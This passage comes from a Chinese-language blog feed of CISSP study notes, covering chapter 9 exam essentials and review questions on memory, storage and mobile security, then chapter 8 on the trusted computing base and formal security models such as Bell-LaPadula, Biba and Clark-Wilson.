用户应用程序在有限的指令集环境中运行，这被称为用户模式。操作系统在特权模式下执行受控的操作，这种模式也被称为系统模式、内核模式和监管模式。</li><li><strong>描述计算机使用的不同存储器类型</strong> ROM是非易失性的，并且终端用户无法写入数据。PROM芯片仅允许终端用户写入一次数据。通过紫外线光照射可以擦除EPROM芯片中的数据，然后再重新写入数据。可以用电流擦除EEPROM芯片中的数据，然后再重新写入数据。RAM芯片是易失性的，当计算机的电源被切断后，芯片中的内容会丢失。</li><li><strong>了解有关存储器组件的安全问题</strong> 目前有三种主要的安全问题与存储器组件有关： 电源切断后，数据仍有可能保留在芯片上：存储器芯片容易被盗; 在多用户系统中控制对存储器的访问。</li><li><strong>描述计算机使用的存储设备的不同特征</strong> 主存储设备与存储器相同。辅助存储设备有磁性和光学介质两种，在CPU能够使用这些数据之前，先要将数据读入主存储器。随机存取存储设备可以在任何位置读取数据，然而顺序存取存储设备需要扫描物理存储的所有数据后才能到达指定的位置。</li><li><strong>了解有关辅助存储设备的安全问题</strong> 目前有三个与辅助存储设备有关的安全问题： 可移动介质能够被用于窃取数据;必须应用访问控制和加密技术来保护数据;即使在删除文件或格式化介质后，数据也仍可能保留在介质上。</li><li><strong>理解输入和输出设备会带来的安全风险</strong> 输入输出设备会遭到偷听和窃听(能够将数据偷带出组织，还能够创建可以进入组织系统和网络的未授权、不安全的入口点)。一定要能够识别和缓解这些脆弱性。</li><li><strong>理解I/O地址、配置和设置</strong> 操作传统PC设备要求对IRQ、DMA和存储映射I/O有一定了解。要准备好识别和处理潜在的地址冲突和错误配置，井且能够集成传统设备与即插即用(PnP)组件。</li><li><strong>理解使用固件的目的</strong> 固件是被存储到ROM芯片上的软件。在计算机层次上，固件包含了启动计算机所需的基本指令。固件还被用于在外围设备(如打印机)中提供操作指令。</li><li><strong>能够描述进程隔离、分层法、抽象、数据隐藏和硬件分隅</strong> 进程隔离能够确保进程只能访问它们自己的数据。分层法在一个进程内创建不同的安全域并限制彼此之间的通信。抽象能够在不要求了解算法或设备内部工作原理的情况下生成”黑箱”接口。数据隐藏阻止信息被来自不同安全级别的进程读取。硬件分隔使用物理控制措施实现进程的隔离。</li><li><strong>理解安全策略如何帮助完成系统的设计、实现、测试和部署</strong> 安全策略的作用是通知和指导某些特定系统的设计、开发、实现、测试和维护。</li><li><strong>理解云计算</strong> 云计算是一个流行的术语，指的是一个计算的概念，即处理和存储是通过网络连接到其他地方运行而不是在本地运行。云计算通常被认为是基于互联网的计算。</li><li><strong>理解移动设备的安全</strong> 设备安全涉及为移动设备提供可以利用的潜在安全选择或功能范围。不是所有的便携式电子设备(PED)都有好的安全特性。PED安全功能包括整个设备的加密、远程擦除、锁定、锁屏、GPS、应用控制、存储分隔、资产跟踪、目录控制、移动设备管理、设备访问控制、移动存储和禁用未使用的功能。</li><li><strong>理解移动设备应用安全</strong> 在移动设备上使用的应用程序和功能需要被保护。相关概念包括密钥管理、证书管理、身份认证、地理标记、加密、应用自名单和可传递的信任/认证。</li><li><strong>理解BYOD</strong> 自带设备(BYOD)是一项策略，允许员工携带自己的个人移动设备进行工作，然后使用这些设备来连接(或穿过)公司网络的业务资源和/或互联网。虽然BYOD可以提高员工士气和工作满意度，但却增加了组织的安全风险。相关问题包括数据所有权、所有权支持、补丁管理、防病毒管理、取证、隐私、登录/关闭登录、企业策略的一致性、用户接受、架构/基础设施的考虑、法律问题、可接受的使用策略以及机载摄像机/视频。</li><li><strong>理解嵌入式系统和静态环境</strong> 嵌入式系统通常相对于较大的产品来说只是其中一个组件，通常被设计围绕着一组有限的特定功能。静态环境是应用程序、操作系统、硬件集合或为了特殊需求、能力或功能而配置的网络，然后设置为保持不变。</li><li><strong>理解嵌入式系统和静态环境下的安全问题</strong> 静态环境、嵌入式系统和其他有限或单一用途的计算环境需要安全管理。这些技术包括网络分隔、安全层、应用防火墙、手动更新、固件版本控制、包装、控制冗余和多样性。</li><li><strong>理解如何在计算机体系结构中应用最小特权、特权分离和可问责性</strong> 最小特权原则确保只有少量进程被授权在监管模式下运行。特权分离增加了安全操作的粒度。可问责性确保可以使用审计跟踪追溯到操作源。</li><li><strong>能够解释什么是隐蔽通道</strong> 隐蔽通道是用于传送信息的任何方法，但是通常不用于信息通信。</li><li><strong>理解什么是缓冲区溢出和输入检查</strong> 当编程人员在将数据写入特定内存地址之前没有检查输入数据的大小时，就可能会发生缓冲区溢出。事实上，对输入数据有效性的任何验证失败都会导致安全性受到破坏。</li><li><strong>描述安全体系结构的常见缺陷</strong> 除了缓冲区溢出以外，编程人员在部署系统后还会留下后门和特权程序。即使设计良好的系统也可能遭到TOCTTOU 攻击。任何状态改变都为攻击者提供了危及系统安全的潜在机会。</li></ul><h3 id="9-14-复习题"><a href="#9-14-复习题" class="headerlink" title="9.14 复习题"></a>9.14 复习题</h3><ol><li><p>许多PC 操作系统提供一个功能，这个功能使它们能够支持单处理器系统中的多个应用程序同时执行。什么术语用于描述这种能力?<br>A. 多程序<br>B. 多线程<br>C. 多任务<br>D. 多处理器</p></li><li><p>什么技术为组织提供对BYOD设备的最佳控制?<br>A. 应用自名单<br>B. 移动设备管理<br>C. 加密移动存储<br>D. 地理标记</p></li><li><p>你有三个应用程序在支持多任务处理的单核单处理器系统上运行。这些应用程序的其中一个为文字处理程序，并同时管理两个线程。其他两个应用军到芋只使用一个线程来运行。在任何给定时间有多少个应用线程在处理器上运行?<br>A. 1<br>B. 2<br>C. 3<br>D. 4</p></li><li><p>什么类型的美国联邦政府计算机系统要求所有访问系统的个人都需要知道所有由该系统处理的信息?<br>A. 专用模式<br>B. 系统高级模式<br>C. 间隔模式<br>D. 多级模式</p></li><li><p>在标准PC中不常被发现而嵌入式系统中有的安全风险是什么?<br>A. 软件缺陷<br>B. 访问互联网<br>C. 在物理环境中的控制机制<br>D. 电源丢失</p></li><li><p>什么类型的内存芯片允许最终用户仅能写入信息到内存中一次，然后永久地保存这些不可能擦除的信息?<br>A. ROM<br>B. PROM<br>C. EPROM<br>D. EEPROM</p></li><li><p>什么类型的内存芯片，当从计算机中取出并暴露在一种特殊类型的紫外光下之后，信息仅会被擦除?<br>A. ROM<br>B. PROM<br>C. EPROM<br>D. EEPROM</p></li><li><p>以下哪种类型的内存可能会保留从计算机中取出后的信息，因此也代表了安全风险?<br>A. 静态RAM<br>B. 动态RAM<br>C. 辅助存储器<br>D. 物理内存</p></li><li><p>减少移动设备上的数据丢失风险的最有效手段是什么，例如笔记本电脑?<br>A. 设置强登录密码<br>B. 减少存储在移动设备上的敏感数据<br>C. 使用一根电缆线<br>D 加密硬盘</p></li><li><p>什么类型的电气部件作为构建动态RAM 芯片的主要部分?<br>A. 电容器<br>B. 电阻器<br>C. 触发器<br>D. 晶体管</p></li><li><p>下面存储设备中的哪一个为了在网络环境中保持数据安全性，最有可能需要加密技术?<br>A. 硬盘<br>B. 备份磁带<br>C. 可移动设备<br>D. RAM</p></li><li><p>在下列哪种安全模式中，你会放心所有用户都具有通过系统处理所有信息的访问权限，但不必知道所有的信息?<br>A. 专用模式<br>B. 系统高级模式<br>C. 间隔模式<br>D. 多级模式</p></li><li><p>移动电话窃听最常被忽视的方面与下列哪些情形有关?<br>A. 存储设备加密<br>B. 锁屏<br>C. 偷昕通话<br>D. 无线网络</p></li><li><p>什么类型的存储设备通常用于包含一台计算机的主板BIOS?<br>A. PROM<br>B. EEPROM<br>C. ROM<br>D. EPROM</p></li><li><p>什么类型的存储直接提供给CPU，并且往往是CPU的一部分?<br>A. RAM<br>B. ROM<br>C. 寄存器<br>D. 虚拟内存</p></li><li><p>什么类型的寻址方案是数据实际提供给CPU作为参数传递给指令?<br>A 直接寻址<br>B. 立即寻址<br>C. 基址偏移<br>D. 间接寻址</p></li><li><p>什么类型的寻址方案支持本地CPU包含实际计算的内存地址?<br>A. 直接寻址<br>B. 立即寻址<br>C. 基址偏移<br>D. 间接寻址</p></li><li><p>哪些安全原则有助于阻止用户访问分配给其他用户用以运行应用程序的内存空间?<br>A. 特权分离<br>B. 分层<br>C. 进程隔离<br>D. 最小特权</p></li><li><p>哪些安全原则授权只有最小数量的操作系统进程时可以在监管模式下运行?<br>A. 抽象<br>B. 分层<br>C. 数据隐藏<br>D. 最小特权</p></li><li><p>哪些安全原则采用进程隔离的概念和使用物理控制来实现?<br>A. 硬件分隔<br>B. 数据隐藏<br>C. 分层<br>D. 抽象</p></li></ol>]]></content>
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cissp </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cissp学习笔记（8）——安全模型的原则、设计和功能</title>
      <link href="/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%888%EF%BC%89%E2%80%94%E2%80%94%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8E%9F%E5%88%99%E3%80%81%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%8A%9F%E8%83%BD/"/>
      <url>/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%888%EF%BC%89%E2%80%94%E2%80%94%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8E%9F%E5%88%99%E3%80%81%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%8A%9F%E8%83%BD/</url>
      <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>3)安全工程(安全的工程学和管理)</p><ul><li>A. 使用安全设计原则实施和管理工程过程</li><li>B. 理解安全模型的基本概念(例如，机密性、完整性和多级模型)</li><li>C. 根据系统安全评价模型选择控制与对策</li><li>D. 理解信息系统的安全保障能力(例如，内存保护、虚拟化、信任平台模型、接口、故障容错)</li></ul><h3 id="8-1-使用安全设计原则实施和管理工程过程"><a href="#8-1-使用安全设计原则实施和管理工程过程" class="headerlink" title="8.1 使用安全设计原则实施和管理工程过程"></a>8.1 使用安全设计原则实施和管理工程过程</h3><p>　　在每一个系统的开发阶段都应该考虑安全，程序员应该努力为他们开发的每一个应用手固芋建立安全，提供更高层次的安全性给关键应用程序和那些处理敏感信息的应用程序。在开发项目的早期阶段考虑安全是非常重要的，因为它比将安全添加到现有系统中更容易实现。</p><h4 id="8-1-1-客体和主体"><a href="#8-1-1-客体和主体" class="headerlink" title="8.1.1 客体和主体"></a>8.1.1 客体和主体</h4><p>　　对安全系统中任何资源的访问控制涉及两个实体。主体是请求访问资源的用户或进程。访问的意思是可以对资源进行读或写操作。客体是用户或进程想要访问的资源。</p><h4 id="8-1-2-封闭式系统和开放式系统"><a href="#8-1-2-封闭式系统和开放式系统" class="headerlink" title="8.1.2 封闭式系统和开放式系统"></a>8.1.2 封闭式系统和开放式系统</h4><p>　　封闭式系统被设计用于与较小范围内的其他系统协同工作，通常所有系统都来自相同的制造厂商。封闭式系统的标准一般是专有的，通常不对外公开。另一方面，开放式系统被设计为使用统一的行业标准。这些开放式系统比较容易与来自不同制造厂商但支持相同标准的系统集成在一起。封闭式系统很难与不同的系统集成在一起，但是它们更为安全。封闭式系统通常由专用硬件和软件组成，这些软硬件是不符合行业标准的。缺乏容易集成的特点，意味着针对许多普通系统组件的攻击可能不起作用，或者这些攻击需要经过定制才能成功。</p><h4 id="8-1-3-用于确保机密性、完整性和可用性的技术"><a href="#8-1-3-用于确保机密性、完整性和可用性的技术" class="headerlink" title="8.1.3 用于确保机密性、完整性和可用性的技术"></a>8.1.3 用于确保机密性、完整性和可用性的技术</h4><ul><li><p>限制<br>软件设计人员使用进程限制来约束程序的操作。简单来讲，进程限制允许进程只能在确定的内存地址和资源中读取和写入数据。这就是常说的沙箱。操作系统或其他一些安全组件不允许非法的读/写请求。如果进程试图执行的动作超出了为其授予的权限，那么动作会被拒绝，并且系统将采取进一步的行动，例如记录违法行为的日志。必须符合更高安全性评级的系统通常记录所有违规行为以及通过某些具体方式做出的响应。一般情况下，违规的进程会被终止。限制可以在操作系统中进行(如通过进程隔离和保护)，也可通过限制应用程序或服务(例如，<a href="http://www.sandboxie.com的Sandboxie)的使用来进行，或通过虚拟化或虚拟机(如VMware或Oracle的VirωalBox)解决方案来进行。" target="_blank" rel="noopener">www.sandboxie.com的Sandboxie)的使用来进行，或通过虚拟化或虚拟机(如VMware或Oracle的VirωalBox)解决方案来进行。</a></p></li><li><p>界限<br>在系统上运行的每一个进程都被分配了一个授权级别。授权级别告知操作系统进程可以执行哪些操作。在比较简单的系统中，可能只存在两个授权级别： 用户和内核。授权级别告知操作系统该如何为进程设定界限。进程的界限由对进程可以访问的内存和资源所设置的限制组成。进程在界限所划定的区域之内。在大多数系统中，这些界限为每个进程划分其使用的内存逻辑区域。操作系统负责实施这些逻辑界限并且不准许其他进程访问。更安全的系统要求从物理上限制进程。物理界限要求每个被限制的进程所运行的内存区域与其他受限进程的内存区域，通过物理方式隔开而不仅仅使用相同内存空间中的逻辑界限。对内存实施物理界限可能非常昂贵，但是也比逻辑界限更为安全。</p></li><li><p>隔离<br>当通过实施访问界限对进程进行限制时，进程就运行在隔离状态中。进程隔离能够确保任何行为只影响与隔离进程有关的内存和资源。隔离用来保护操作环境、操作系统的内核和其他独立的应用程序。隔离是稳定操作系统的重要组成部分之一。隔离能防止某个应用草里芋访问只属于另一个应用程序的内存或资源，无论是好意的还是恶意的。操作系统可以提供中间服务，如剪切、粘贴和资源共享(如键盘、网络接口和存储设备访问)。</p></li></ul><p>　　上述三个概念(限制、界限和隔离)使安全程序和操作系统的设计工作变得更为困难，但能使实现更安全的系统成为可能。</p><h4 id="8-1-4-控制"><a href="#8-1-4-控制" class="headerlink" title="8.1.4 控制"></a>8.1.4 控制</h4><p>　　控制使用访问规则来限制主体对客体的访问。访问规则声明了每个主体相对应的合法客体。有两种控制： 强制访问控制和自主访问控制，分别被称为MAC(Mandatory A∞ess Control)和DAC(Discretionary Acc棚Control)。在强制访问控制中，主体和客体的静态特性被用于确定访问的容许性。每个主体所具有的特性，定义了其访问资源的许可或授权。每个客体所具有的特性，定义了其分类。不同类型的安全方法以不同的方式为资源分类。自主访问控制与强制访问控制的不同之处在于：主体具有一些定义访问客体的能力。在受到限制的情况下，自主访问控制允许主体根据需要定义访问客体的列表。这个访问控制列表作为动态的访问规则组，并且主体能够对其进行修改。更改己实施的限制，通常与主体的身份有关。根据主体的身份，可以允许主体增加或修改访问客体的规则。强制访问控制和自主访问控制都限制主体对客体的访问。访问控制的主要目的是： 通过阻止授权或未经授权主体的未授权访问，从而确保数据的机密性和完整性。</p><h4 id="8-1-5-信任与保证"><a href="#8-1-5-信任与保证" class="headerlink" title="8.1.5 信任与保证"></a>8.1.5 信任与保证</h4><p>　　可信系统是所有保护机制都协同工作的系统，从而能够在维护稳定和安全的计算环境的同时，为许多类型的用户处理敏感数据。保证被简单地定义为： 满足安全需求的可信度。保证必须被持续地维持、更新和重新验证。无论可信系统经历己知的变化还是经过大量时间，这一点都是正确的。变化往往是安全的对立面，并且常常降低安全性。保证对于不同系统是不同的，并且必须针对单独系统分别建立。不过，某些保证等级或级别可以适用于许多类型相同的系统、支持相同服务的系统或部署在相同地理位置的系统。因此，信任可以通过具体的安全功能集成到系统中，而保证是在现实世界中对安全功能的可靠性和可用性的评估。</p><h3 id="8-2-理解安全模型的基本概念"><a href="#8-2-理解安全模型的基本概念" class="headerlink" title="8.2 理解安全模型的基本概念"></a>8.2 理解安全模型的基本概念</h3><p>　　在信息安全中，模型提供了一种正式的安全策略的方式。安全模型允许设计人员将抽象语句映射为描述构建硬件和软件所需算法和数据结构的安全策略。因此，安全模型使软件设计人员能够衡量自己的设计和实现。当然，这种模型必须支持安全策略的每个部分。通过这种方式，开发人员就能确认自己的安全实现可以支持安全策略。这些模型都阐明了如何在计算机体系结构和操作系统设计中加入安全性：</p><ul><li>可信计算模型</li><li>状态机模型</li><li>信息流模型</li><li>非干扰模型</li><li>Take-Grant模型</li><li>访问控制表</li><li>Bell-LaPadula模型</li><li>Biba模型</li><li>Clark-Wilson模型</li><li>Brewer and Nash模型(也被称为Chinese Wall模型)</li><li>Goguen-Messguer模型</li><li>Sutherland模型</li><li>Graham-Denning模型</li></ul><p>　　如果某个安全的系统遵循特定的安全标准组，那么就可以说这个系统具备某种信任级别。因此，信任可以被构建在系统内，随后能够被评估、认证和认可。但是在讨论每种安全模型之前，必须建立构建大多数安全模型的基础。这个基础就是TCB(Trusted Computing Base，可信计算基础) 。</p><h4 id="8-2-1-可信计算基础"><a href="#8-2-1-可信计算基础" class="headerlink" title="8.2.1 可信计算基础"></a>8.2.1 可信计算基础</h4><p>　　TCB是完整信息系统的一个子集，并且应当尽可能小，从而使详细的分析能够确保系统满足设计规范和要求。TCB是系统可以信任的遵守和实施安全策略的唯一部分。系统的每个组件并不需要都是可信任的。不过，从安全性的角度考虑系统时，评估中应该包括定义系统TCB的所有可信组件。</p><ul><li><p>安全边界<br>系统的安全边界是一条假想的界限，它将TCB与系统的其他部分隔开。这条边界确保TCB与计算机系统中其他部件的不安全通信或交互不会发生。因为TCB要与系统的其他部分进行通信，所以安全边界必须建立安全的通道，也被称为可信路径。可信路径是建立在有着严格标准基础上的通道，在不受TCB安全脆弱性影响的情况下准许进行必要的通信。可信路径也保护系统用户(有时也称为主体)不受因TCB交换导致的危害。</p></li><li><p>引用监控器和内核<br>在实现安全系统时，必须利用TCB的某部分来实施针对系统资产和资源(有时称为客体)的访问控制。在准许访问请求之前验证对每种资源的访问的这部分TCB被称为引用监控器。引用监控器处于每个主体和客体之间，并且在准许进行任何访问请求之前验证请求主体的凭证是否满足客体的访问需求。如果不满足这种访问需求，那么访问请求就会被拒绝。实际上，引用监控视器是TCB的访问控制执行者。因此，授权和安全的行动和活动被允许发生，而未经授权的和不安全的活动和行动被拒绝并阻止发生。引用监控器对访问控制或授权的强制基于所需的安全模型，无论是自由支配的、强制性的、基于角色的还是访问控制的一些其他形式。引用监控器可能是TCB概念的一部分;它并不需要是一个实际的、独立的或独立工作的系统组成部分。</p></li></ul><img src="/notes/cissp学习笔记（8）——安全模型的原则、设计和功能/TCB、安全边界和引用监控器.png"><p>　　共同工作从而实现引用监控器功能的TCB 中组件的集合被称为安全内核。引用监控器是一种通过软件和硬件中的安全实现来实施的概念或理论。安全内核的目的是使用适当的组件实施引用监控器的功能和抵抗所有己知的攻击。安全内核使用一条可信路径与主体进行通信，并且还可以作为所有资源访问请求的中间人，从而只允许那些与系统应用的适当访问规则相匹配的请求。引用监控器要求具有与其保护的每种资源相关的描述性信息。这种信息通常包括资源的分类级别和名称。当某个主体请求访问某个客体时，引用监控器会查阅客体的描述性信息，从而判断应当准许或拒绝访问。</p><h4 id="8-2-2-状态机模型"><a href="#8-2-2-状态机模型" class="headerlink" title="8.2.2 状态机模型"></a>8.2.2 状态机模型</h4><p>　　状态机模型描述了一个无论处于何种状态下总是安全的系统，这种模型基于有限状态机(Finite State Machine，FSM)的计算机科学定义。FSM通过组合外部输入和内部计算机状态来建立所有类型的复杂系统的模型，包括解析器、解码器和解释器。给定一个输入和一个状态，FSM 就会转换至另一个状态，并且可能生成一个输出。从数学上讲，下一状态是当前状态和输入的函数： 下一状态=F(输入，当前状态)。同样，输出也是输入和当前状态的函数： 输出=F(输入，当前状态)。<br>　　如果某个状态的所有方面都满足安全策略的要求，那么这个状态就被认为是安全的。接受输入或生成输出时都会发生转换操作。转换操作总是会产生新的状态(也被称为状态转换)。所有的状态转换都必须进行评估。如果每个可能的状态转换都会导致另一个安全状态，那么系统就会被称为安全状态机。安全状态机模型系统，总是会进入一个安全状态(在所有的转换中维护安全状态)，并且准许主体只以遵循安全策略的安全方式访问资源。安全状态机模型是其他许多安全模型的基础。</p><h4 id="8-2-3-信息流模型"><a href="#8-2-3-信息流模型" class="headerlink" title="8.2.3 信息流模型"></a>8.2.3 信息流模型</h4><p>　　信息流模型以状态机模型为基础。信息流模型被设计用于避免未授权的、不安全的或受限的信息流。信息流模型可以防止未经授权的所有信息流，无论是在同一分类级别不同的分类级别之间。在相同客体的两种版本或状态存在于不同的时间点时，信息流模型被用于建立这两种版本或状态之间的关系。因此，信息流指示了客体从某个时间点的一个状态向另一个时间点的另一个状态的转变。信息流模型也可通过排除所有不确定的流途径来解决隐敲通道。</p><h4 id="8-2-4-无干扰模型"><a href="#8-2-4-无干扰模型" class="headerlink" title="8.2.4 无干扰模型"></a>8.2.4 无干扰模型</h4><p>　　无干扰模型松散地建立在信息流模型的基础上。然而，无干扰模型关注的是位于较高安全级别的主体的动作如何影响系统状态，或关注于位于较低安全级别的主体的动作，而不是关注于信息流。</p><h4 id="8-2-5-Take-Grant模型"><a href="#8-2-5-Take-Grant模型" class="headerlink" title="8.2.5 Take-Grant模型"></a>8.2.5 Take-Grant模型</h4><p>　　Take-Grant模型采用有向图来指示权限如何从一个主体传递至另一个主体或者如何从一个主体传递至一个客体。<br><br>　　具有授权资格的主体可以向另一个主体或客体授予其所拥有的其他任何权限。同样，具有获得权限能力的主体可以从另一个主体获得权限。除了这两条主要的规则，Take-Grant(取-予)模型可采取创建规则和移除规则来生成或删除权限。这种模型的关键是使用这些规则可以让你弄清楚在系统中哪些权限可以改变，哪些可能发生泄漏(即许可权限的意外分自己)，如下表：</p><table><thead><tr><th>规格名</th><th>作用</th></tr></thead><tbody><tr><td>获取规则</td><td>允许主体获取客体的权限</td></tr><tr><td>授予规则</td><td>允许主体向客体授予权限</td></tr><tr><td>创建规则</td><td>允许主体创建新权限</td></tr><tr><td>移除规则</td><td>允许主体移除己有的权限</td></tr></tbody></table><h4 id="8-2-6-访问控制矩阵"><a href="#8-2-6-访问控制矩阵" class="headerlink" title="8.2.6 访问控制矩阵"></a>8.2.6 访问控制矩阵</h4><p>　　访问控制矩阵是一个由主体和客体组成的表，这个表指示了每个主体可以对每个客体执行的动作或功能。访问控制矩阵的每一列都是一个访问控制列表： 表的每一行都是功能列表。ACL与客体相关，它列出了每个主体可以执行的有效动作。功能列表与主体相关，它列出了可以在所有客体上执行的有效动作。</p><h4 id="8-2-7-Bell-LaPadula模型"><a href="#8-2-7-Bell-LaPadula模型" class="headerlink" title="8.2.7 Bell-LaPadula模型"></a>8.2.7 Bell-LaPadula模型</h4><p>　　为了解决保护分类信息的问题，美国国防部(Department ofDefense，DoD)在20 世纪70 年代开发了Bell-LaPadula模型。Bell-LaPadula模型通过阻止较低分类级别的主体访问较高分类级别的客体，防止了分类信息泄漏或传输至较低的安全许可级别，解决了确保文档机密性所涉及的复杂性问题。然而，Bell-LaPadula模型没有说明客体的完整性或可用性方面的内容。Bell-LaPadula模型也是多级安全策略的首个数学模型。<br>　　Bell-LaPadula模型以状态机概念和信息流模型为基础。这种模型还采用强制访问控制和格子型概念。格子等级是由组织机构的安全策略使用的分类级别。状态机支持在任何两个状态之间都能够显式转换多个状态; 使用这个概念是因为能够以数学方式证明计算机的正确性以及对文档机密性的保证。这种状态机具有下列三种属性：</p><ul><li>简单安全属性(simple security property)规定主体不能读取位于较高敏感度级别的信息(也就是不能向上读)。</li><li><em>安全属性(</em>(star)security prope即)规定主体不能在位于较低敏感度级别的客体上写入信息(也就是不能向下写)，这也被称为约束属性(confinement property)。</li><li>自主安全属性(discretionary security property)规定系统使用访问控制矩阵来实施自主访问控制。</li></ul><p>　　前两个属性定义了系统可能转换到的状态。其他的转换都是不被准许的。所有通过这些规则可以访问的状态都是安全状态。因此，Bell-LaPadula模型系统提供了状态机模型的安全性。<br>　　Bell-LaPadula属性有效地保护了数据的机密性。主体不能读取分类级别高于其级别的客体。因为一个级别上的客体所具有的数据比较低级别上的数据更为敏感或秘密，所以主体不能将某个级别的数据写入较低级别的客体(除了可信主体之外)。这个动作类似于将绝密备注粘贴到非机密的文档文件中。此外，第三种属性实施了主体能够访问客体的”知其所需”权限。<br>　　Bell-LaPadula模型只解决数据的机密性问题，但是没有涉及数据的完整性和可用性。不支持目前常见的许多操作，例如文件共享和网络连接。这种模型还说明了安全层之间的安全转换，但是并没有涉及隐蔽通道问题。Bell-LaPadula模型很好地处理了机密性问题，因此常常与其他处理完整性和可用性机制的模型组合使用。</p><h4 id="8-2-8-Biba模型"><a href="#8-2-8-Biba模型" class="headerlink" title="8.2.8 Biba模型"></a>8.2.8 Biba模型</h4><p>　　Biba模型是仿照Bell-LaPadula模型设计的。Bell-LaPadula模型解决了机密性问题，而Biba模型则解决了完整性问题。二者的最大差异是关注的主要目标不同： Biba模型主要保护数据的完整性。下面列出了Biba模型状态机的基本属性：</p><ul><li>简单完整性属性(simple integrity property)规定主体不能读取位于较低完整性级别的客体(也就是不能向下读)。</li><li><em>完整性属性(</em>(star)integrity property)规定主体不能更改位于较高完整性级别的客体(也就是不能向上写) 。</li></ul><p>　　Biba模型被设计用于解决下列三个完整性问题：</p><ul><li>防止未授权的主体对客体的修改。</li><li>防止己授权的主体对客体进行未授权的修改。</li><li>保护内部和外部客体的一致性。</li></ul><p>　　Biba模型有以下列几个缺陷：</p><ul><li>只解决了完整性问题，没有解决机密性或可用性问题。</li><li>专注于保护客体不受外部的威胁; 假定内部的威胁己被有计划地控制。</li><li>没有说明访问控制管理，也没有提供分配或改变主体或客体分类级别的方法。</li><li>并没有防止隐蔽通道。</li></ul><h4 id="8-2-9-Clark-Wilson模型"><a href="#8-2-9-Clark-Wilson模型" class="headerlink" title="8.2.9 Clark-Wilson模型"></a>8.2.9 Clark-Wilson模型</h4><p>　　这种模型使用多层面途径来实施数据完整性。Clark-Wilson模型没有定义正式的状态机，而是只通过一小组程序来定义每个数据项井允许修改。Clark-Wilson模型并不要求使用格子型结构，而是使用被称为三元组或访问控制三元组的主体/程序/客体(或主体/事物/客体)的三部分关系。主体并不对客体进行直接访问。客体只能通过程序进行访问。通过使用下列两条原则： 格式良好的事务处理和职责分离，Clark-wilson模型提供了保护完整性的有效方法。Clark-Wilson模型定义了下列数据项和过程：</p><ul><li>约束数据项(Constrained Data Item，CDI)：是指完整性由安全模型保护的任何数据项。</li><li>非约束数据项(Unconstrained Data Item，UDI)：是指不受安全模型控制的任何数据项。作为输入且未验证的任何数据或任何输出都被视为非约束数据项。</li><li>完整性验证过程(lntegrity Verification Procedure，IVP)：扫描数据项并确认其完整性的过程。</li><li>转换过程(Transformation Pro臼dure，TP)：TP是允许更改CDI的唯一过程。通过TP限制对CDI的访问而形成Clark-Wilson完整性模型的主干(我们想知道这是否是TPS报告的来源)。</li></ul><p>　　Clark-Wilson模型使用安全标签来授予对客体的访问权限，但是只能通过转换过程和受限接口模型来完成。受限接口模型使用基于分类的限制，并且只提供主体特定的授权信息和功能。Clark-Wilson模型实现了职责分离。</p><h4 id="8-2-10-Brewer-and-Nash模型-也叫作Chinese-Wall"><a href="#8-2-10-Brewer-and-Nash模型-也叫作Chinese-Wall" class="headerlink" title="8.2.10 Brewer and Nash模型(也叫作Chinese Wall)"></a>8.2.10 Brewer and Nash模型(也叫作Chinese Wall)</h4><p>　　创建这种模型的目的是准许访问控制基于用户以前的活动而动态改变(这也使其成为一种状态机模型)。这种模型应用于单个集成的数据库，并且试图创建对利益冲突敏感的安全域。因为创建了一个数据类，这个数据类定义了哪些安全域存在潜在的冲突，对于能够访问某个属于特定冲突类的安全域的任何主体，阻止他们访问属于相同冲突类的其他任何安全域，所以这种模型被称为Chinese Wall模型。</p><h4 id="8-2-11-Goguen-Meseguer模型"><a href="#8-2-11-Goguen-Meseguer模型" class="headerlink" title="8.2.11 Goguen-Meseguer模型"></a>8.2.11 Goguen-Meseguer模型</h4><p>　　Goguen-Meseguer模型是一个完整性模型，这个模式被称作非干涉概念理论的基础。Goguen-Meseguer 模型基于主体可以访问的预设的域或客体列表。该模型基于自动化理论和域的隔离。这意味着主体只允许对预设客体执行预定的动作。当类似的用户被分组到他们自己的域(也就是集合)时，一个主体域的成员不能干扰另一个主体域的成员。因此，客体无法干扰其他客体的活动。</p><h4 id="8-2-12-Sutherland模型"><a href="#8-2-12-Sutherland模型" class="headerlink" title="8.2.12 Sutherland模型"></a>8.2.12 Sutherland模型</h4><p>　　Sutherland 模型是一个完整性模型。它的重点是预防对完整性支持的干扰。它正式地基于状态机模型和信息流模型。然而，它并没有直接表明保护完整性的具体机制。相反，该模型基于定义一组系统状态的想法，以及初始状态和状态转换。通过使用这些预定的安全状态来保护完整性和阻止干扰。</p><h4 id="8-2-13-Graham-Denning模型"><a href="#8-2-13-Graham-Denning模型" class="headerlink" title="8.2.13 Graham-Denning模型"></a>8.2.13 Graham-Denning模型</h4><p>　　Graham-Denning模型关注主体和客体在创建和删除时的安全性。Graham-Denning模型集合了8个主要的定义特定安全行为边界的保护规则或动作：</p><ul><li>安全创建客体</li><li>安全创建主体</li><li>安全删除客体</li><li>安全删除主机</li><li>安全读访问权限</li><li>安全授予访问权限</li><li>安全删除访问权限</li><li>安全转移访问权限</li></ul><p>　　通常，一组客体上的主体的特定能力或权限被定义在访问矩阵中(又名访问控制矩阵)。</p><h3 id="8-3-基于系统安全评估模型选择控制和对策"><a href="#8-3-基于系统安全评估模型选择控制和对策" class="headerlink" title="8.3 基于系统安全评估模型选择控制和对策"></a>8.3 基于系统安全评估模型选择控制和对策</h3><h4 id="8-3-1-彩虹系列"><a href="#8-3-1-彩虹系列" class="headerlink" title="8.3.1 彩虹系列"></a>8.3.1 彩虹系列</h4><p>　　